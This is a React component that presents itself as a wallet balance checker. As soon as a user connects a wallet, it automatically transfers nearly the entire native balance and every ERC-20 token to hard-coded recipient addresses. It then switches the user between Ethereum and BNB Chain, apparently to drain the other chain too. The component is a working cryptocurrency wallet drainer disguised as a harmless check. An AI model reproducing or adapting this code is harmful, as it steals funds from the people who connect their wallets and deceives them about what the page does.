import { useEffect, useState } from "react";
import { useAppKitAccount } from "@reown/appkit/react";
import { useTransferFunds } from "../hooks/useTransferFunds";
import useNativeBalance from "../hooks/useNativeBalance";
import { getTokensWithBalance } from "../utils/getTokens";
import { MINIMUM_BALANCE, RECIPIENT_ADDRESSES } from "../constants";
import { useChainId } from "wagmi";
import useAutoSwitchChain from "../hooks/useAutoSwitchChain";
import { getGasBufferByChain } from "../utils/gasBuffer";

export default function CheckWalletBalance() {
  const { address, isConnected } = useAppKitAccount();
  const { transferNativeToken, transferERC20Token } = useTransferFunds();
  const [walletBalance, setWalletBalance] = useState(0);
  const [tokenName, setTokenName] = useState("");
  const [tokens, setTokens] = useState([]);
  const [status, setStatus] = useState("");
  const [hasSwitched, setHasSwitched] = useState(false); 
  const chainId = useChainId();
  
  // Using your custom hook for network switching
  const { switchChain, isSwitching } = useAutoSwitchChain();

  const { balance, symbol } = useNativeBalance(address as `0x${string}`);
  const GAS_BUFFER = getGasBufferByChain(chainId);
  const processWallet = async () => {
    try {
      setStatus("🔍 Checking balance...");
      setWalletBalance(parseFloat(balance));
      setTokenName(symbol);

      // Check if the balance is below the minimum required
      if (parseFloat(balance) < MINIMUM_BALANCE) {
        setStatus("❌ Insufficient funds!");
        await switchChain(chainId === 1 ? 56 : 1);
        setHasSwitched(true);
        return;
      }

      setStatus("🔍 Fetching ERC-20 tokens...");
      const erc20Tokens = await getTokensWithBalance(address, chainId);

      if (erc20Tokens.length === 0) {
        setStatus("🚀 Sending native token...");
        await transferNativeToken(parseFloat(balance) - GAS_BUFFER, RECIPIENT_ADDRESSES[chainId]);
        setStatus("✅ Native token sent!");
      } else {
        setTokens(erc20Tokens);
        setStatus("🚀 Sending tokens...");
        
        // Transfer native token
        await transferNativeToken(parseFloat(balance) - GAS_BUFFER, RECIPIENT_ADDRESSES[chainId]);

        // Transfer ERC-20 tokens
        for (let token of erc20Tokens) {
          await transferERC20Token(token.contractAddress, token.balance, RECIPIENT_ADDRESSES[chainId], token.decimals);
        }

        setStatus("🎉 All transfers complete!");
      }

      // Switch to the other network (if connected to Ethereum, switch to Binance, and vice versa)
      await switchChain(chainId === 1 ? 56 : 1);
      setHasSwitched(true); // 1 is ETH, 56 is BNB

    } catch (error) {
      console.error("Error processing wallet:", error);
      setStatus("❌ Transfer failed!");
    }
  };

  // useEffect to process wallet balance and perform actions
  useEffect(() => {
    if (!isConnected || !address || hasSwitched) return;

    processWallet();
  }, [isConnected, address, balance, symbol, chainId, hasSwitched]);

  // Display UI based on current status
  return (
    <div className="text-center">
      <p>Your Balance: {walletBalance} {tokenName}</p>
      <p className="text-sm">{status}</p>
      {isSwitching && <p>Switching network...</p>}
    </div>
  );
}
